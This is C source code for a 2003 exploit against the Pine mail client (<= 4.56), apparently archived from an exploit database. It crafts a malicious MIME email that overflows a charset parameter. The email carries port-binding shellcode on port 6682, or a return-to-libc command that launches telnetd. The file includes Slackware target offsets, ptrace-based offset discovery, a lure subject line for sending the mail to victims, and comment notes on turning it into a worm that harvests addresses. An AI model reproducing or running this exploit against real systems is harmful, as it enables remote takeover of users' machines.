/*
 * Mon Sep 15 09:35:01 CEST 2003
 *
 * (remote?) Pine <= 4.56 exploit
 * by sorbo (sorbox yahoo com)
 * darkirco
 *
 * Ok won't talk much about the bug since as usual idefense advisories
 * are *proper* advisories and explain everything... exploiting the bug
 * is trivial after reading the adv:
 * http://www.idefense.com/advisory/09.10.03.txt
 *
 * There are two ways of doing this:
 * 1) standard shellcode
 * we don't need offset here because of nature of hole...
 * all we need is distance from a variable to eip which is quite fixed
 * it is not like we need an "offset somewhere in stack"
 * just a relative distance
 *
 * 2) ret to libc (should work on fbsd too)
 * this requires our command string somewhere in memory
 * we may use .bss (fixed)
 * we also need distance from variable to ebp (quite fixed)
 * and we need addr of system (fixed)
 * This is "own" grsec since we don't really run a shellcode
 * and directly overwrite eip
 *
 * In both method i said u need the dist from var -> eip/ebp
 * this can actually be "bruteforced"
 * I didn't show this since this is a PoC and uses "exact offsets"
 * All u do is supply multiple charsets and overwrite larger areas of memory
 * This makes method 1 100% successfull (or letys say 99.9%)
 * (nice for remote exploitation)
 *
 * Method 2 is "slightly harder" to bruteforce since u must NOT overwrite 
 * eip... so u must "stop ur bruteforce ad ebp" somehow... but thats kinda
 * gay ;D
 *
 * With unfallable method one a worm can easily be done...
 * shellcode that listens and uploads worm...
 * and executes a grep \@ /var/spool/mail/bla or whatever to get emails
 * or pine addr book
 *
 * also for normal "owning" u can use reverse telnetd shellcode
 * so u just keep a server up and don't have to "wait" for person
 * to launch sploit
 *
 * Greetz: zen-parse (thanks for your patience (if im not in ur ignore ;D))
 *		non metto i soliti stronzi de merda nei greetz (tipo gunzip ;D)
 *		e specialmente kuelle ke non me la danno ;D ahahah
 *
 *		#areyoucrazy@ircnet
 *			(most leet chan... fill it up with ur bots ;D)
 *
 *	and last but not least... the world must know: s0lar TI AMO!!!
 *
 *
 * ok enough... hope this exp is lame enough i wanted to close my summer
 * vacation with it and proove the world i had nothing better to do =D
 * college is starting c ya
 *
 * to own remotely: ./sorpine -o 1 -t bla bla com | sendmail -t
 *
 * Enjoy have fun!
 *
 */

#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <errno.h>
#include <linux/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <signal.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
              
              
#define PINE "/usr/bin/pine"
#define PLIST 50	/* a location buff-PLIST that is writable (.bss) */

/* port bind command ;D
 * from vi spawn a shell duh...
 *
 */
char *lame_cmd = 
"/usr/sbin/in.telnetd -L /usr/bin/vi -debug 6682 & /bin/killall -9 pine";


struct target_info {
	char desc[1024];
	int method;	/* 0 easy , 1 hard */
	int dist;	/* eip or ebp depending on method */
	int buff;
	int sys;
};



/*
 * notice to slackware maintainers:
 * sorry guyz.. its not that im against u
 * its that I only use slack =(
 * thats y all my exps only have slack targets ;D
 * keep up the good work =D
 * plus... its free advertisment for u!
 *
 */
struct target_info targets[] = {

{ "Slackware 9.0",0,300,0,0},
{ "Slackware 9.0",1,296,0x083c8f15,0x0804aeda},

{ "Slackware 8.1",0,284,0,0},
{ "Slackware 8.1",1,280,0x0838e0d5,0x0804aeca},

{ "Slackware 8.0",0,284,0,0},
{ "Slackware 8.0",1,280,0x0836d875,0x0804a5ba}
};


/*
 * Non usable chars in egg (sc and various addrs)
 * 
 */
char nonusable[] = "\x09\x0a\x0d\x28\x29\x5c";

/*
 * lame (but working??) modification of sorshell
 * no setsockopt() =((( too long
 * portbinding shellcode with terminal support
 * (if whatever i said makes sense)
 * port 6682
 * telnet ip 6682
 * ^]
 * telnet> mode character
 *
 * funny how my ret to libc does the same thing and its 0 byte shellcode ;D
 *
 */
char shellcode[] =
"\x31\xc9\xf7\xe1\xb0\x02\xcd\x80\x39\xc8\x74\x05\x31\xc0\x40\xcd\x80\x31"
"\xc0\xb0\x06\x50\xb0\x01\x50\x89\xc3\x40\x50\xb0\x66\x89\xe1\xcd\x80\x89"
"\xc2\x31\xdb\x53\x66\xb9\x1a\x1a\xc1\xe1\x10\xb1\x02\x51\x89\xe1\x6a\x10"
"\x51\x52\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x52\x89\xe1\xb0\x66\xb3"
"\x04\xcd\x80\x31\xc0\x50\x50\x52\x89\xe1\xb0\x66\x43\xcd\x80\x89\xc7\x89"
"\xd3\x89\xc1\xb0\x06\x89\xc8\x31\xd2\x52\x68\x70\x74\x6d\x78\x68\x64\x65"
"\x76\x2f\x68\x2f\x2f\x2f\x2f\x31\xc9\xb1\x02\x89\xe3\xb0\x05\xcd\x80\x89"
"\xc6\x52\x89\xe2\xb9\x31\x54\x04\x40\x89\xf3\xb0\x36\xcd\x80\x89\xe2\xb9"
"\x30\x54\x04\x80\xb0\x36\xcd\x80\x59\x83\xc1\x30\xc1\xe1\x18\xba\x01\x74"
"\x73\x2f\xc1\xea\x08\x01\xca\x31\xc9\x51\x52\x31\xd2\x68\x65\x76\x2f\x70"
"\x68\x2f\x2f\x2f\x64\xb1\x02\x89\xe3\xb0\x05\xcd\x80\x89\xc2\xb0\x02\xcd"
"\x80\x31\xc9\x39\xc8\x75\x3f\xb0\x42\xcd\x80\xb1\x03\x31\xc0\x89\xd3\xb0"
"\x3f\x49\xcd\x80\x41\xe2\xf8\x89\xd3\xb0\x06\xcd\x80\x89\xf3\xb0\x06\xcd"
"\x80\x89\xfb\xb0\x06\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x89\xd3"
"\x31\xc0\xb0\x06\xcd\x80\x83\xec\x50\x31\xc9\xf7\xe1\x31\xdb\x89\xf9\x43"
"\xd3\xe3\x01\xd8\x89\xf1\x31\xdb\x43\xd3\xe3\x01\xd8\x50\x89\xda\x89\xcb"
"\x43\x89\xe1\x52\x57\x56\x31\xff\x31\xf6\x31\xc0\x99\xb0\x8e\xcd\x80\x5e"
"\x5f\x5b\x58\x21\xd8\x31\xdb\x39\xc3\x75\x1b\xb2\x50\x89\xe1\x89\xfb\x31"
"\xc0\xb0\x03\xcd\x80\x83\xf8\x01\x7c\x26\x89\xc2\x89\xf3\xb0\x04\xcd\x80"
"\xeb\xad\xb2\x50\x89\xe1\x89\xf3\x31\xc0\xb0\x03\xcd\x80\x83\xf8\x01\x7c"
"\x0b\x90\x89\xc2\x89\xfb\xb0\x04\xcd\x80\xeb\x91\x31\xc0\x40\xcd\x80";


/* cause a break and have a "test" number to check */
char testsc[] = "\xcc\x01\x02\x03\x04";

struct bss {
	int start;
	int end;
};

char mail[6666];	/* this is basically the "egg" */

void die(int i, char *m) {
        if(i)
                perror(m);
        else
                printf("%s\n",m);
        exit(0);
}


/*
 * prepare boring part of email
 *
 */
void prepare_mail(char *from, char *sub, char *to) {
	snprintf(mail,sizeof(mail),
			"From: %s\n"
			"Subject: %s\n"
			"To: %s\n"
			"MIME-Version: 1.0\n"
			"Content-Type: multipart/related;\n"
			" type=\"multipart/alternative\";\n"
			" boundary=sorbo-rox\n\n"
			"--sorbo-rox\n",from,sub,to);
}


/*
 * ok here da tricky bit
 * arg: number of bytes (distance)
 *
 * it returns a positive unsigned int
 * that becomes negative when singed
 * that when *4 becomes signed
 * matching our distance
 * yeah kinda dirty... i hate numbers ;D
 * w00t
 *
 */
unsigned int num(int dist) {
        int tmp = -1-dist;
        unsigned int border = tmp;
        int neg = (border/4)*(-1);
        unsigned int res;

        res = 0xffffffff+neg;

        return res;
}

/*
 * ret-to-libc system() grsex 0wned
 *
 * we overwrite ebp
 * we control esp (heap)
 * we make stack perfect and make it ret to system
 * 
 *
 * conditions plist must be writable (bss is ok)
 * we must know addr of ptr to our command (bss is fixed)
 *
 * NOTE: segfault after shell is NORMAL since it will return to plist addr
 *
 */
void own_hard(int sys, int plist, int cmd, int dist, char *command) {
	char egg[1024];
	
	int *ptr = (int*)&egg[0];
	
	*ptr = 0x41414141; /* ebp */
	ptr++;
	*ptr = sys; /* system */
	ptr++;
	*ptr = plist; /* ret /  plist */
	ptr++;
	*ptr = cmd; /* /bin/sh */
	ptr++;
	*ptr = 0;

	/* practice: exploit this exploit =D */	
	sprintf(mail+strlen(mail),
		"Content-Type: message/external-body;\n"
		" access-type=\"%s\";\n"
		" charset*%u*=\"%s\";\n"
		"Content-Transfer-Encoding: 8bit\n"
		"--sorbo-rox--\n",
		command,num(dist), egg);
	
}

/*
 * we overwrite ret addr and own it
 * no offset needed since we control area pointer by ret directly
 * well we do need the stack distance from params to eip
 *
 */
void own_easy(int dist, char *s) {

	/* practice: exploit this exploit =D */	
	sprintf(mail+strlen(mail),
		"Content-Type: text/html;\n"
		" charset*%u*=\"%s\";\n"
		"Content-Transfer-Encoding: 8bit\n"
		"--sorbo-rox--\n",
		num(dist), s);

}

/* create a lame pinerc */
void pinerc() {
	int pid;
	
	pid = fork();
	if(pid == -1)
		die(1,"fork()");
	
	if(!pid) {
		char *arg[] = { "pine","-p","/tmp/pinerc", NULL };
		close(1);
		close(2);
		
		execve(PINE,arg,NULL);
		die(1,"execve()");
	}
	else {
		sleep(1);
		kill(pid,SIGKILL);
		wait(NULL);
	}
	
	if(system("grep -v inbox-path /tmp/pinerc > /tmp/o "
		"&& mv /tmp/o /tmp/pinerc && "
		"echo inbox-path=/tmp/meil >> /tmp/pinerc")<0)
		die(1,"system()");
}

void write_mail(char *path) {
	FILE *f;
	
	f = fopen(path,"w");
	if(!f)
		die(1,"fopen()");
	
	if(fprintf(f,"From sorbo  Tue Nov 29 00:00:00 1983\n%s",mail) < 1)
		die(1,"fprintf()");

	fclose(f);		
}

char *line;

/* get a free tty */
int getty(int *master, int *slave) {
        if ((*master = open("/dev/ptmx", O_RDWR)) == -1)
                return -1;

        if (grantpt(*master) == -1 ||
                unlockpt(*master) == -1 ||
                (line = (char*)ptsname(*master)) == NULL ||
                (*slave = open(line, O_RDWR)) == -1) {

                close(*master);
                return -1;
        }

        return 0;
}

/* fire up debugged process (and continue && wait) */
int start_debug(int cont) {
        int pid = fork();
	int slave,master;
	
	/* we associate it to tty cuz ncurses fucks up screen */
	if( getty(&master,&slave) == -1)
		die(0,"getty()");

        if(pid == -1)
                die(1,"fork()");

        /* child */
        if(!pid) {
                char *arg[] = { "pine", "-p","/tmp/pinerc","-I",
                	"l,>,>,<,<,q,y",NULL };

                if(ptrace(PTRACE_TRACEME,NULL,NULL)==-1)
                        die(1,"ptrace()");

		if ((pid = open(line, O_RDWR)) == -1)
			die(1,"open()");
		                           
                           
		dup2(pid,0);
 		close(1);
 		close(2);
                execv(PINE,arg);
                die(1,"execve()");
        }
        else {
		wait(NULL);
		if(cont) {
	                if(ptrace(PTRACE_CONT,pid,0,0) == -1)
	                        die(1,"ptrace()");
			wait(NULL);
		}
	}
	return pid;
}

void stop_debug(int pid) {
        if(ptrace(PTRACE_KILL,pid,0,0) == -1)
        	die(1,"ptrace()");

	wait(NULL);
}

/* 
 * 0 = nope
 * 1 = yea
 * duh ;D
 *
 */
int test_dist() {
        struct user_regs_struct regs;
        int x;
                                
        int pid = start_debug(1);
                                

        if(ptrace(PTRACE_GETREGS,pid,NULL,&regs)==-1)
		return 0;	/* exited normally prolly */

//                printf("EIP=%x\n",regs.eip);		
	x = ptrace(PTRACE_PEEKTEXT,pid,regs.eip,NULL);
        if(x == -1 && errno != 0 && errno != EIO)
               	die(1,"ptrace()");
//		printf("INSTR=%x\n",x);                                                      
                         

	stop_debug(pid);

	if(x == *((int*)&testsc[1])) 
		return 1;
		
	return 0;
}

/* popen and get line */
char *getShit(char *cmd) {
        FILE *f;
        static char buff[1024];

        f = popen(cmd,"r");

        if(f == NULL) {
                perror("popen");
                exit(0);
        }

        buff[0] = 0;

        fgets(buff,sizeof(buff),f);
        pclose(f);

        return &buff[0];

}

/* get a number from a popen */
int getInt(char *p) {
        char *ptr = getShit(p);
        int ret = 0;
        if(sscanf(ptr,"%x",&ret)!=1) {
                printf("Error in getting addr\n");
                exit(0);
        }
        return ret;
}

/* get start and end of bss */
struct bss getbss() {
	struct bss b;
	
	b.start = getInt("objdump --headers "
		PINE" | grep \" .bss\" | awk '{print $4}'");
	b.end =  getInt("objdump --headers "
		PINE" | grep \" .bss\" | awk '{print $3}'");
	
	b.end += b.start;		

	return b;
}

/* find our buff (command) in the process memory .bss */
int findbuf(int ebp) {
	struct bss b;
	int pid;
	int cmd = 0x12345678;
	int addr;
	int ret = -1;
        struct user_regs_struct regs;
	int x;

	
	b = getbss();
	
	printf(".bss START =0x%.8x END=0x%.8x\n",b.start,b.end);
	prepare_mail("from","subj","to");
	own_hard(0x41414141,b.start,b.start,ebp,(char*)&cmd);
	write_mail("/tmp/meil");

	addr = b.start;

        pid = start_debug(1);


        if(ptrace(PTRACE_GETREGS,pid,NULL,&regs)==-1)
		return -1;	/* exited normally prolly */
		
//        printf("EIP=%x\n",regs.eip);		
	if(regs.eip != 0x41414141)
		return -1;
		
	for(addr = b.start; addr < b.end; addr++) {
		printf("Checking 0x%.8x\r",addr);
		fflush(stdout);
		x = ptrace(PTRACE_PEEKTEXT,pid,addr,NULL);
                if(x == -1 && errno != 0)
           		 die(1,"ptrace()");
		if(x == cmd) {
			ret = addr;
			break;
		}
	}
	stop_debug(pid);
	putchar('\n');		
	return ret;
}

/* get system from libc */
int getSystem() {
        int base;
        int offset;
        char tmp[1024*2];
	char libc[512];

        /* binary specific */
        base = getInt("ldd " PINE 
        	" | grep \"libc\\.\" | awk '{print $4}' | tr -d \"()\"");
//        printf("GLIBC base addr 0x%.8x\n",base);

        /* get libc path */
        snprintf(libc,sizeof(libc),"%s",getShit("ldd " PINE 
        	" | grep \"libc\\.\" | awk '{print $3}'"));
        
        if(strlen(libc) <2) {
                printf("can't get libc location\n");
                exit(0);
        }
        libc[strlen(libc)-1] = 0;

        /* lib specific */
        snprintf(tmp,sizeof(tmp),"objdump -T %s | grep \\ system | "
        	"awk '{print $1}' ",libc);

        offset = getInt(tmp);
 //       printf("GLIBC __libc_system offset 0x%.8x\n",offset);

        offset += base;

  //      printf("system() addr 0x%.8x\n",offset);

        return offset;

}

/* check if offset contains non usable chars */
int isUsable(int x) { 
	int i,j;
	
	for(i = 0; i < sizeof(x); i++) 
		for(j =0; j < sizeof(nonusable); j++) 
			if( *(((unsigned char*)&x)+i) == nonusable[j]) 
				return 0;
	return 1;
}

/* get various system offsets */
int *getSystemOffsets() {
	static int off[3];
	int pid;
	int x;
	
	off[0] = getSystem();
	off[1] = getInt("objdump -T "PINE" | grep system | awk '{print $1}'");
	off[2] = getInt("objdump -R "PINE" | grep system | awk '{print $1}'");

	pid = start_debug(0);
	x = ptrace(PTRACE_PEEKTEXT,pid,off[2],NULL);

        if(x == -1 && errno != 0)
        	die(1,"ptrace()");
        off[2] = x;
        
	stop_debug(pid);
        
	return &off[0];
}

/* get target from local pine */
struct target_info getTarget() {
	struct target_info target;
	int *sysa;
	int i;
	char os[512];

	/* get a description of target */
	snprintf(os,sizeof(os),getShit("uname -sr | tr -d '\n'"));
	snprintf(target.desc,sizeof(target.desc),"%s Pine %s",os,
		getShit(PINE" -v | awk '{print $2}' | tr -d '\n'"));
	printf("Trying to own: %s\n",target.desc);


	pinerc();

	/* find stack dist from params -> eip */
	printf("Searching stack distance\n");
	for(target.dist = 4; target.dist < 1024; target.dist+=4) {
		prepare_mail("from","subj","to");
		own_easy(target.dist,testsc);
		write_mail("/tmp/meil");
		printf("Testing target.dist %d\r",target.dist);
		fflush(stdout);
		if(test_dist())
			break;
	}
	printf("\n");
	if(target.dist == 1024)
		die(1,"Can't find dist");
	printf("DIST=%d\n\n",target.dist);

	printf("Ok theoretically we can exploit it the easy way\n"
		"looking for hard way shit now\n\n");

	/* find our buffer on bss ebp should b eip-4 */	
	target.buff = findbuf(target.dist-4);
	target.method = 0;
	if(target.buff != -1) {
		target.method = 1;
		if(!isUsable(target.buff) || !isUsable(target.buff-PLIST))
			die(0,"TODO: addr not usuable... trivial to fix");
		printf("Our command will lie in 0x%.8x\n\n",target.buff);
	
		/* find usable system() addr */
		printf("Obtaining system() addr list\n");
		sysa = getSystemOffsets();
	
		for(i = 0; i < 3; i++) {
			int usable = isUsable(sysa[i]);
			printf("System %d:0x%.8x %s\n",i,sysa[i],
				usable?"OK":"NOT OK");
			if(usable)
				target.sys = sysa[i];
		}
		printf("Will use 0x%.8x\n\n",target.sys);
	}
	else
		printf("Unable to do things the hard way =(\n");

	unlink("/tmp/pinerc");
	unlink("/tmp/meil");

	printf("Summary of targets for this system:\n"
		"{ \"%s\",0,%d,0,0},\n",target.desc,target.dist);
	if(target.method)
		printf("{ \"%s\",1,%d,0x%.8x,0x%.8x}\n",
		target.desc,target.dist-4,target.buff,target.sys);

	return target;
}


/* yeah kids luv this */
void skriptkiddie_s0lar() {
	char *mbox;
	FILE *f;
	struct target_info target;	
	
	
	printf("O shit... is it s0lar running this exp again?\n"
"not even a -h? ok lets make her happy and make everyhing magically work\n"
		"WARNING: need write axx on /tmp and use of gdb (no grsec high)\n\n");

	target  = getTarget();


	
	mbox = (char*)getenv("MAIL");
	if(!mbox)
		die(0,"getenv()");
		
	printf("Attempting to write mails to %s\n",mbox);
	f = fopen(mbox,"a");
	if(!f)
		die(1,"fopen()");

	/* first mail (easy) */
	prepare_mail("Andrei Koymaski <andrei gay ru>",
	"Easy method portbind 6682","Gustavo Lamazza <gustavo gay it>");
	own_easy(target.dist,shellcode);
	if(fprintf(f,"From sorbo Tue Nov 29 00:00:00 1983\n%s\n",mail)<1)
		die(1,"fprintf()");


	/* second mail (hard) 
	 * we run vi and then
	 * :!/bin/sh
	 * cuz we don't have enough space to make a bindshell and shit
	 */
	if(target.method) {
		prepare_mail("Osama Bin Laden <osama al-quaeda ar>",
"Hard method (owns grsec) portbind 6682 with vi... spawn shell from vi",
			"George Bush <george whitehouse gov>");
		own_hard(target.sys,target.buff-PLIST,target.buff,
			target.dist-4,
		lame_cmd);

	if(fprintf(f,"From sorbo Tue Nov 29 00:00:00 1983\n%s\n",mail)<1)
		die(1,"fprintf()");
	}
	
	printf("You should have mail... read with pine and see if this"
		" crap worx\n");
	printf("Enjoy.... s0lar ti amo\n");
	exit(0);

}


void listTargets() {
	int i;
	
	printf( "Id\tDescription\tMethod\tDist\tBuff\t\tsystem()\n"
"========================================================================\n");
	for(i =0; i < sizeof(targets)/sizeof(struct target_info); i++) {
		printf("%d\t%s\t%s\t%d\t0x%.8x\t0x%.8x\n",
		i,targets[i].desc,targets[i].method?"hard":"easy", 
		targets[i].dist,targets[i].buff,targets[i].sys);
	}
}

/* own a target */
void own(struct target_info t,char *from,char *sub,char *to) {
	prepare_mail(from,sub,to);

	/* hard */
	switch(t.method) {
		case 1: 
			own_hard(t.sys,t.buff-PLIST,t.buff,t.dist,lame_cmd);
			break;
	
		case 0:
			own_easy(t.dist,shellcode);
			break;
	
		default:
			die(0,"Unknown ownage method");	
	}

	printf("%s",mail);

}

void usage(char *m) {
	printf("Usage: %s <opts>\n"
	"-h\tthis lame message\n"
	"-f\tfrom\n"
	"-t\tto\n"
	"-s\tsub\n"
	"-o\ttarget\n"
	"-m\tmethod 0:easy 1:hard(grsex)\n"
	"-d\tdist\n"
	"-b\tbuff\n"
	"-l\tsystem\n\n"
	,m);
	listTargets();
}

int main(int argc, char *argv[]) {
	char from[512];
	char to[512];
	char sub[512];
	int opt;
	struct target_info t;
	struct target_info *target = &t;	/* we shall own this */

	strcpy(from,"Justin Time <admin playboy com>");
	strcpy(to,"You <winners playboy com>");
	strcpy(sub,"You are selected! Come get your FREE playboy.com account");

	t.method = -1;
	t.buff = 0;
	t.sys = 0;
	t.dist = 0;

	fprintf(stderr,"(remote?) Pine <= 4.56 exploit "
	"by sorbo (sorbox yahoo com)\np s  grsec won't save you =(\n\n");

	if(argc<2)
		skriptkiddie_s0lar();
		
        while( (opt = getopt(argc,argv,"hf:t:s:o:m:d:b:l:")) != -1) {
        	switch(opt) {
        		default:
        		case 'h':
        			usage(argv[0]);
        			exit(0);

			case 'm':
				t.method = atoi(optarg);
				break;
			case 'd':
				t.dist = atoi(optarg);
				break;
			case 'b':
 				if(sscanf(optarg,"%x",&t.buff) != 1)
 					die(0,"Can't parse buff addr");
 				break;
			case 'l':
 				if(sscanf(optarg,"%x",&t.sys) != 1)
 					die(0,"Can't parse sys addr");
 				break;

        		
        		case 'f':
        			/* does snprintf put the 0 at end if arg
        			 * barely fits ? i never really looked into
        			 * this... hope it does! ;D
        			 */
        			snprintf(from,sizeof(from),"%s",optarg);
        			break;
        		case 't':
        			snprintf(to,sizeof(to),"%s",optarg);
        			break;
        		case 's':
        			snprintf(sub,sizeof(sub),"%s",optarg);
        			break;
        		case 'o': {
        			unsigned int o = atoi(optarg);
        			if(o >= 
        			sizeof(targets)/sizeof(struct target_info))
        				die(0,"Target outta range");
        			target = &targets[o];
        			break;
        		}
                }
        }        
	
	/* check if we got all we need */
	if(target == &t) {
		if(!t.dist)
			die(0,"provide dist");
		if(t.method == 1) 
			if(!t.buff || !t.sys)
				die(0,"buff or sys not provided");
	}
	
	/* go for it */
	own(*target,from,sub,to);
        exit(0);	
}

// milw0rm.com [2003-09-16]
